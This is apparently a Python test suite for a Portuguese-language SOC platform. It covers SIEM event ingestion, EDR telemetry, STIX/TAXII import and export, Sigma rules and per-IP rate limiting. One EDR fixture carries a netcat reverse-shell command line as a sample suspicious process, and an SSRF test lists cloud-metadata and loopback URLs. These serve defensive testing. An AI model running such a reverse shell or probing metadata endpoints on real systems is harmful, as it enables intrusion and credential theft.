# SENTINELA-COPYRIGHT-INICIO
# Copyright (c) 2026 Vinicius Martins. Todos os direitos reservados.
# Sentinela SOC -- software proprietário; uso, cópia e distribuição somente sob licença.
# Ver o arquivo LICENSE na raiz do projeto.
# SENTINELA-COPYRIGHT-FIM
"""API SIEM/CTI/Sigma/EDR contra Postgres real (V8.2)."""
import pytest

from tests.api.conftest_api import logar
from tests.api.test_agentes_api import _criar_agente_e_obter_token

CSRF = {"X-Sentinela-CSRF": "1"}


@pytest.mark.asyncio
async def test_ingestao_agente_rejeita_evento_invalido_sem_perder_o_lote(client, superadmin_de_teste, usuario_de_teste):
    token = await _criar_agente_e_obter_token(client, superadmin_de_teste, usuario_de_teste, "host-siem-v82")
    h = {"X-Sentinela-Agent-Token": token}
    eventos = [
        {"source": "Security", "source_type": "windows_event_log", "event_type": "4625", "message": "falha", "source_ip": "10.0.0.9"},
        {"source": "Security", "source_type": "windows_event_log", "message": "ip ruim", "source_ip": "999.0.0.1"},
        {"source": "flow", "source_type": "netflow", "message": "fluxo", "destination_ip": "198.51.100.1"},
    ]
    r = await client.post("/api/v1/agentes/eventos", json={"eventos": eventos}, headers=h)
    assert r.status_code == 202, r.text
    corpo = r.json()
    assert corpo["recebidos"] == 2 and corpo["rejeitados"] == 1 and corpo["erros"][0]["indice"] == 1
    # segundo lote: total por fonte soma só o lote (bug: somava o histórico)
    r = await client.post("/api/v1/agentes/eventos", json={"eventos": eventos[:1]}, headers=h)
    assert r.status_code == 202
    await logar(client, usuario_de_teste["email"], usuario_de_teste["senha"])
    r = await client.get("/api/v1/siem/eventos?limite=10")
    assert r.status_code == 200 and len(r.json()) == 3


@pytest.mark.asyncio
async def test_lote_so_com_eventos_invalidos_e_422(client, superadmin_de_teste, usuario_de_teste):
    token = await _criar_agente_e_obter_token(client, superadmin_de_teste, usuario_de_teste, "host-siem-422")
    r = await client.post("/api/v1/agentes/eventos", json={"eventos": [{"source": "x"}]},
                          headers={"X-Sentinela-Agent-Token": token})
    assert r.status_code == 422


@pytest.mark.asyncio
async def test_heartbeat_edr_deduplicado(client, superadmin_de_teste, usuario_de_teste, pool):
    token = await _criar_agente_e_obter_token(client, superadmin_de_teste, usuario_de_teste, "host-edr-v82")
    corpo = {"hostname": "host-edr-v82", "sistema_operacional": "linux", "versao_agente": "8.2.0", "total_processos": 10,
             "processos_suspeitos": [{"pid": 4242, "nome": "nc", "usuario": "root", "linha_de_comando": "nc -e /bin/sh 1.2.3.4 4444"}]}
    for _ in range(3):
        r = await client.post("/api/v1/agentes/heartbeat", json=corpo, headers={"X-Sentinela-Agent-Token": token})
        assert r.status_code == 200, r.text
    await logar(client, usuario_de_teste["email"], usuario_de_teste["senha"])
    r = await client.get("/api/v1/edr/telemetria")
    assert r.status_code == 200 and len(r.json()) == 1


@pytest.mark.asyncio
async def test_stix_bundle_real_importa_e_exporta(client, usuario_de_teste):
    await logar(client, usuario_de_teste["email"], usuario_de_teste["senha"])
    bundle = {"type": "bundle", "id": "bundle--1", "objects": [
        {"type": "indicator", "id": "indicator--aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa", "pattern_type": "stix",
         "pattern": "[ipv4-addr:value = '203.0.113.77']", "valid_until": "2099-01-01T00:00:00Z",
         "labels": ["malicious-activity"], "confidence": 90},
        {"type": "malware", "id": "malware--x", "name": "x"},
    ]}
    r = await client.post("/api/v1/cti/stix/bundle", json=bundle, headers=CSRF)
    assert r.status_code == 200, r.text
    assert r.json() == {"importados": 1, "ignorados": 1}
    r = await client.get("/api/v1/cti/indicadores")
    assert r.json()[0]["valor"] == "203.0.113.77"
    r = await client.get("/api/v1/cti/stix/export")
    obj = r.json()["objects"][0]
    assert obj["valid_from"].endswith("Z") and obj["pattern"] == "[ipv4-addr:value = '203.0.113.77']"
    r = await client.get("/api/v1/cti/taxii/collections/nao-existe/objects")
    assert r.status_code == 404
    r = await client.get("/api/v1/cti/taxii/collections/sentinela-indicators/objects")
    assert r.status_code == 200 and r.headers["content-type"].startswith("application/taxii+json")


@pytest.mark.asyncio
async def test_taxii_import_recusa_destino_interno(client, usuario_de_teste):
    await logar(client, usuario_de_teste["email"], usuario_de_teste["senha"])
    for url in ("https://127.0.0.1/taxii/", "https://169.254.169.254/latest/meta-data/", "http://example.com/"):
        r = await client.post("/api/v1/cti/taxii/import", json={"url": url}, headers=CSRF)
        assert r.status_code == 422, (url, r.text)


@pytest.mark.asyncio
async def test_sigma_regra_nao_suportada_e_422_e_valida_e_aceita(client, usuario_de_teste):
    await logar(client, usuario_de_teste["email"], usuario_de_teste["senha"])
    ruim = {"nome": "agg", "titulo": "agregacao", "detection": {"sel": {"EventID": 4625}, "condition": "sel | count() > 5"}}
    r = await client.post("/api/v1/sigma/regras", json=ruim, headers=CSRF)
    assert r.status_code == 422
    boa = {"nome": "falha_login", "titulo": "Falha de login", "nivel": "high", "logsource": {"product": "windows"},
           "detection": {"sel": {"EventID": 4625}, "condition": "sel"}}
    r = await client.post("/api/v1/sigma/regras", json=boa, headers=CSRF)
    assert r.status_code == 200, r.text
    assert r.json()["detection"]["condition"] == "sel"


@pytest.mark.asyncio
async def test_edr_valida_entrada(client, usuario_de_teste):
    await logar(client, usuario_de_teste["email"], usuario_de_teste["senha"])
    for corpo in ({"tipo": "x", "destino_ip": "nao-ip"}, {"tipo": "x", "hash_sha256": "zz"}, {"tipo": "x", "pid": -1}):
        r = await client.post("/api/v1/edr/telemetria", json=corpo, headers=CSRF)
        assert r.status_code == 422, corpo
    r = await client.get("/api/v1/edr/telemetria?limite=-5")
    assert r.status_code == 422


@pytest.mark.asyncio
async def test_agente_legitimo_em_alta_frequencia_nao_e_barrado_pelo_backstop_por_ip(client, superadmin_de_teste, usuario_de_teste):
    """Regressão V8.1: o backstop por IP (40/60s) contava TODA requisição
    autenticada, então um Agent enviando lotes a cada 250 ms tomava 429."""
    token = await _criar_agente_e_obter_token(client, superadmin_de_teste, usuario_de_teste, "host-alta-freq")
    h = {"X-Sentinela-Agent-Token": token}
    ev = {"eventos": [{"source": "s", "source_type": "unix_log", "message": "linha"}]}
    for i in range(60):
        r = await client.post("/api/v1/agentes/eventos", json=ev, headers=h)
        assert r.status_code == 202, (i, r.status_code, r.text)


@pytest.mark.asyncio
async def test_backstop_por_ip_ainda_bloqueia_flood_de_tokens_forjados(client, superadmin_de_teste, usuario_de_teste):
    token = await _criar_agente_e_obter_token(client, superadmin_de_teste, usuario_de_teste, "host-flood")
    codigos = []
    for i in range(45):
        r = await client.post("/api/v1/agentes/eventos", json={"eventos": []},
                              headers={"X-Sentinela-Agent-Token": f"agt_{i:012x}_forjado"})
        codigos.append(r.status_code)
        # sucessos intercalados não podem "zerar" o flood
        await client.post("/api/v1/agentes/eventos", json={"eventos": []}, headers={"X-Sentinela-Agent-Token": token})
    assert 429 in codigos


@pytest.mark.asyncio
async def test_lista_correlacoes_com_evento_de_origem(client, superadmin_de_teste, usuario_de_teste):
    await logar(client, usuario_de_teste["email"], usuario_de_teste["senha"])
    r = await client.post("/api/v1/siem/eventos/lote", headers=CSRF, json=[
        {"source": "Security", "source_type": "windows_event_log", "event_type": "4625", "severity": "WARNING",
         "message": "falha de logon", "username": "maria", "hostname": "DC01"},
    ])
    assert r.status_code == 200, r.text
    r = await client.get("/api/v1/siem/dashboard/correlacoes")
    assert r.status_code == 200
    c = r.json()[0]
    assert c["regra"] == "windows_failed_auth" and c["username"] == "maria" and c["regras"] == ["windows_failed_auth"]


@pytest.mark.asyncio
async def test_ips_saem_sem_mascara_e_sigma_manual_casa_ip(client, usuario_de_teste):
    """inet::text devolvia '10.0.0.5/32' -- quebrava a exibição e a avaliação
    manual de Sigma com IP exato."""
    await logar(client, usuario_de_teste["email"], usuario_de_teste["senha"])
    r = await client.post("/api/v1/sigma/regras", headers=CSRF, json={
        "nome": "ip_exato", "titulo": "IP exato", "detection": {"sel": {"IpAddress": "10.0.0.5"}, "condition": "sel"}})
    assert r.status_code == 200
    r = await client.post("/api/v1/siem/eventos/lote", headers=CSRF, json=[
        {"source": "s", "message": "m", "source_ip": "10.0.0.5", "severity": "HIGH"}])
    evento_id = r.json()["evento_ids"][0]
    r = await client.get("/api/v1/siem/eventos")
    assert r.json()[0]["source_ip"] == "10.0.0.5"
    r = await client.post(f"/api/v1/sigma/avaliar-evento/{evento_id}", headers=CSRF)
    assert [m["regra"] for m in r.json()["matches"]] == ["ip_exato"]
    c = (await client.get("/api/v1/siem/dashboard/correlacoes")).json()[0]
    assert c["source_ip"] == "10.0.0.5" and c["sigma"][0]["nome"] == "ip_exato"
